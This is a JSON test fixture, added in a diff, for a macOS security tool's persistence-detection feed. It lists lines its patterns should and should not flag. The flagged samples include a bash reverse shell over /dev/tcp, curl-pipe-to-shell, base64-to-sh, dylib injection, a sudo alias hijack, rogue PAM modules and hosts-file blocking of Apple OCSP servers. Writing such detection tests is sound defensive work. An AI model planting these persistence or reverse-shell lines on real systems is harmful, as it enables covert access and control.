@@ -1,0 +1,380 @@
+{
+  "comment": "Positive (match) and negative (noMatch) samples for feeds/macos-persistence-example.json. Each group applies to every entry whose label starts with one of its prefixes. Run by Tests/xVigilCoreTests/ExampleFeedTests.swift (ICU, the app's regex engine) and scripts/test-feed-patterns.py (Python re).",
+  "contentGroups": [
+    {
+      "name": "launchd: executable in temp, shared or hidden path",
+      "entries": [
+        "Persistence: user LaunchAgents - runs",
+        "Persistence: system LaunchAgents - runs",
+        "Persistence: LaunchDaemons - runs"
+      ],
+      "match": [
+        "<key>Program</key><string>/tmp/x</string>",
+        "<key>ProgramArguments</key>\n\t<array>\n\t\t<string>/private/tmp/x</string>",
+        "<key>ProgramArguments</key><array><string>/var/folders/ab/T/x</string>",
+        "<key>Program</key>\n<string>/Users/Shared/x</string>",
+        "<key>ProgramArguments</key><array><string>/Users/x/Library/.mainhelper</string>",
+        "<key>ProgramArguments</key>\n<array>\n<string>/bin/bash</string>\n<string>/tmp/.x.sh</string>",
+        "<key>ProgramArguments</key><array><string>/bin/sh</string><string>-c</string><string>cd /Users/Shared/.u &amp;&amp; ./run</string>",
+        "<key>ProgramArguments</key><array><string>/usr/bin/python3</string><string>/var/folders/x/T/a.py</string>"
+      ],
+      "noMatch": [
+        "<key>Program</key><string>/Applications/Foo.app/Contents/MacOS/foo</string>",
+        "<key>ProgramArguments</key><array><string>/opt/homebrew/bin/foo</string>",
+        "<key>ProgramArguments</key><array><string>/Users/x/.local/bin/foo</string><string>--x</string>",
+        "<key>StandardOutPath</key><string>/tmp/foo.log</string>",
+        "<key>StandardErrorPath</key>\n<string>/Users/x/.foo.log</string>",
+        "<key>ProgramArguments</key><array><string>/usr/local/bin/foo</string><string>--log=/tmp/foo.log</string>",
+        "<key>WatchPaths</key><array><string>/tmp/trigger</string>"
+      ]
+    },
+    {
+      "name": "launchd: one-liner or dylib injection",
+      "entries": [
+        "Persistence: user LaunchAgents - shell",
+        "Persistence: system LaunchAgents - shell",
+        "Persistence: LaunchDaemons - shell"
+      ],
+      "match": [
+        "<key>DYLD_INSERT_LIBRARIES</key>",
+        "<string>-c</string>\n\t\t<string>curl -s http://x | bash</string>",
+        "<string>/bin/sh</string><string>-c</string><string>python3 -c 'import socket'</string>",
+        "<string>bash -i >& /dev/tcp/1.2.3.4/80 0>&1</string>",
+        "<string>echo aGk= | base64 -d | sh</string>",
+        "<string>/usr/bin/osascript</string>"
+      ],
+      "noMatch": [
+        "<string>/bin/sh</string>\n<string>-c</string>\n<string>/usr/local/bin/backup.sh</string>",
+        "<key>RunAtLoad</key>",
+        "<string>/usr/bin/open</string>"
+      ]
+    },
+    {
+      "name": "shell startup files",
+      "entries": [
+        "Persistence: ~/.",
+        "Persistence: /etc zsh",
+        "Persistence: /etc/profile",
+        "Persistence: /etc/bashrc"
+      ],
+      "note": "A commented-out curl | sh line still matches, by design.",
+      "match": [
+        "curl -fsSL https://x.sh | sh",
+        "wget -qO- http://x | sudo bash",
+        "eval \"$(curl -s http://x)\"",
+        "echo x | base64 --decode",
+        "exec 5<>/dev/tcp/1.2.3.4/80",
+        "export DYLD_INSERT_LIBRARIES=/tmp/x.dylib",
+        "nohup /tmp/.x &",
+        "alias sudo='/tmp/s'",
+        "sudo() { /tmp/x; }",
+        "# curl https://x | sh"
+      ],
+      "noMatch": [
+        "export PATH=/opt/homebrew/bin:$PATH",
+        "eval \"$(/opt/homebrew/bin/brew shellenv)\"",
+        "alias ll='ls -la'",
+        "source ~/.cargo/env",
+        ". \"$HOME/.cargo/env\"",
+        "export NVM_DIR=\"$HOME/.nvm\"",
+        "curl -fsSL https://x.sh -o /tmp/x.sh",
+        "curl -s https://x | shasum -a 256"
+      ]
+    },
+    {
+      "name": "periodic scripts",
+      "entries": [
+        "Persistence: periodic daily",
+        "Persistence: periodic weekly",
+        "Persistence: periodic monthly"
+      ],
+      "match": [
+        "curl x | sh",
+        "/dev/tcp/1.1.1.1/1",
+        "osascript -e x"
+      ],
+      "noMatch": [
+        "/usr/sbin/periodic",
+        "rm -rf /tmp/cache"
+      ]
+    },
+    {
+      "name": "emond",
+      "entries": [
+        "Persistence: emond"
+      ],
+      "match": [
+        "<key>type</key>\n<string>RunCommand</string>"
+      ],
+      "noMatch": [
+        "<key>type</key><string>Log</string>"
+      ]
+    },
+    {
+      "name": "ssh client config",
+      "entries": [
+        "Access: ~/.ssh/config"
+      ],
+      "match": [
+        "PermitLocalCommand yes",
+        "Host x\n  LocalCommand /tmp/x"
+      ],
+      "noMatch": [
+        "Host bastion\n  ProxyCommand ssh -W %h:%p jump",
+        "# PermitLocalCommand yes"
+      ]
+    },
+    {
+      "name": "sshd_config",
+      "entries": [
+        "Access: sshd_config"
+      ],
+      "match": [
+        "PermitRootLogin yes",
+        "  permitrootlogin YES",
+        "PermitEmptyPasswords yes",
+        "AuthorizedKeysCommand /x",
+        "GatewayPorts yes",
+        "PermitTunnel point-to-point"
+      ],
+      "noMatch": [
+        "#PermitRootLogin yes",
+        "PermitRootLogin no",
+        "PermitRootLogin prohibit-password",
+        "UsePAM yes",
+        "AuthorizedKeysFile .ssh/authorized_keys",
+        "GatewayPorts no"
+      ]
+    },
+    {
+      "name": "PAM",
+      "entries": [
+        "Auth: PAM config"
+      ],
+      "match": [
+        "auth optional pam_exec.so /tmp/x",
+        "auth required /usr/local/lib/pam_evil.so",
+        "auth sufficient /tmp/pam_x.so",
+        "auth optional pam_script.so"
+      ],
+      "noMatch": [
+        "auth       sufficient     pam_opendirectory.so",
+        "auth optional /opt/homebrew/lib/pam/pam_reattach.so",
+        "#auth required /tmp/x.so",
+        "account    required       pam_permit.so",
+        "auth       sufficient     pam_tid.so"
+      ]
+    },
+    {
+      "name": "sudo_local",
+      "entries": [
+        "Auth: sudo_local"
+      ],
+      "match": [
+        "auth sufficient pam_permit.so",
+        "auth required pam_unix.so",
+        "auth optional /tmp/pam_x.so"
+      ],
+      "noMatch": [
+        "auth       sufficient     pam_tid.so",
+        "auth       optional       /opt/homebrew/lib/pam/pam_reattach.so",
+        "#auth       sufficient     pam_tid.so",
+        "auth       sufficient     pam_smartcard.so"
+      ]
+    },
+    {
+      "name": "/etc/hosts",
+      "entries": [
+        "Traffic: /etc/hosts"
+      ],
+      "match": [
+        "127.0.0.1 updates.cdn-apple.com",
+        "127.0.0.1 ocsp.apple.com",
+        "0.0.0.0 gdmf.apple.com",
+        "127.0.0.1 mesu.apple.com",
+        "127.0.0.1 ocsp2.apple.com",
+        "127.0.0.1 OCSP.Apple.com",
+        "0.0.0.0\tocsp.apple.com # block",
+        "127.0.0.1 localhost ocsp.apple.com"
+      ],
+      "noMatch": [
+        "127.0.0.1 localhost",
+        "255.255.255.255 broadcasthost",
+        "# 127.0.0.1 ocsp.apple.com",
+        "127.0.0.1 www.apple.com",
+        "127.0.0.1 cdn-apple.com",
+        "127.0.0.1 ocsp.apple.com.example.net",
+        "127.0.0.1 evil-ocsp.apple.com"
+      ]
+    },
+    {
+      "name": "browser native messaging hosts",
+      "entries": [
+        "Browser: "
+      ],
+      "match": [
+        "\"path\": \"/tmp/host\"",
+        "\"path\":\"/Users/Shared/h\"",
+        "\"path\": \"/var/folders/x/T/h\"",
+        "\"path\": \"/Users/x/.hidden\""
+      ],
+      "noMatch": [
+        "\"path\": \"/Applications/1Password.app/Contents/MacOS/op\"",
+        "\"path\": \"/Library/Application Support/Foo/host\"",
+        "\"path\": \"/Users/x/.local/bin/host\""
+      ]
+    }
+  ],
+  "globs": [
+    {
+      "entry": "Persistence: user LaunchAgents - runs",
+      "file": "a.plist",
+      "resolves": true
+    },
+    {
+      "entry": "Persistence: user LaunchAgents - runs",
+      "file": "a.plist.bak",
+      "resolves": false
+    },
+    {
+      "entry": "Persistence: ~/.zshrc",
+      "file": ".zshrc",
+      "resolves": true
+    },
+    {
+      "entry": "Persistence: ~/.zshrc",
+      "file": ".zshenv",
+      "resolves": true
+    },
+    {
+      "entry": "Persistence: ~/.zshrc",
+      "file": ".zshrc.bak",
+      "resolves": true
+    },
+    {
+      "entry": "Persistence: ~/.zshrc",
+      "file": ".zsh_history",
+      "resolves": false
+    },
+    {
+      "entry": "Persistence: ~/.zprofile",
+      "file": ".zprofile",
+      "resolves": true
+    },
+    {
+      "entry": "Persistence: ~/.zprofile",
+      "file": ".zlogin",
+      "resolves": true
+    },
+    {
+      "entry": "Persistence: ~/.zprofile",
+      "file": ".zlogout",
+      "resolves": true
+    },
+    {
+      "entry": "Persistence: ~/.zprofile",
+      "file": ".zcompdump",
+      "resolves": false
+    },
+    {
+      "entry": "Persistence: ~/.zprofile",
+      "file": ".zshrc",
+      "resolves": false
+    },
+    {
+      "entry": "Persistence: ~/.bashrc",
+      "file": ".bashrc",
+      "resolves": true
+    },
+    {
+      "entry": "Persistence: ~/.bashrc",
+      "file": ".bash_profile",
+      "resolves": true
+    },
+    {
+      "entry": "Persistence: ~/.bashrc",
+      "file": ".bash_login",
+      "resolves": true
+    },
+    {
+      "entry": "Persistence: ~/.bashrc",
+      "file": ".bash_logout",
+      "resolves": true
+    },
+    {
+      "entry": "Persistence: ~/.bashrc",
+      "file": ".bash_history",
+      "resolves": false
+    },
+    {
+      "entry": "Persistence: /etc zsh",
+      "file": "zshrc",
+      "resolves": true
+    },
+    {
+      "entry": "Persistence: /etc zsh",
+      "file": "zprofile",
+      "resolves": true
+    },
+    {
+      "entry": "Persistence: /etc zsh",
+      "file": "zshrc_Apple_Terminal",
+      "resolves": true
+    },
+    {
+      "entry": "Persistence: /etc/zlogin",
+      "file": "zlogin",
+      "resolves": true
+    },
+    {
+      "entry": "Persistence: /etc/zlogin",
+      "file": "zlogout",
+      "resolves": true
+    },
+    {
+      "entry": "Persistence: /etc/zlogin",
+      "file": "zshrc",
+      "resolves": false
+    },
+    {
+      "entry": "Persistence: periodic *.local",
+      "file": "daily.local",
+      "resolves": true
+    },
+    {
+      "entry": "Persistence: periodic *.local",
+      "file": "weekly.local",
+      "resolves": true
+    },
+    {
+      "entry": "Persistence: periodic *.local",
+      "file": "monthly.local",
+      "resolves": true
+    },
+    {
+      "entry": "Persistence: periodic *.local",
+      "file": "hosts.local",
+      "resolves": false
+    },
+    {
+      "entry": "Access: SSH authorized_keys",
+      "file": "authorized_keys",
+      "resolves": true
+    },
+    {
+      "entry": "Access: SSH authorized_keys",
+      "file": "authorized_keys2",
+      "resolves": true
+    },
+    {
+      "entry": "Persistence: user LaunchAgent masquerading",
+      "file": "com.apple.x.plist",
+      "resolves": true
+    },
+    {
+      "entry": "Persistence: user LaunchAgent masquerading",
+      "file": "com.foo.plist",
+      "resolves": false
+    }
+  ]
+}
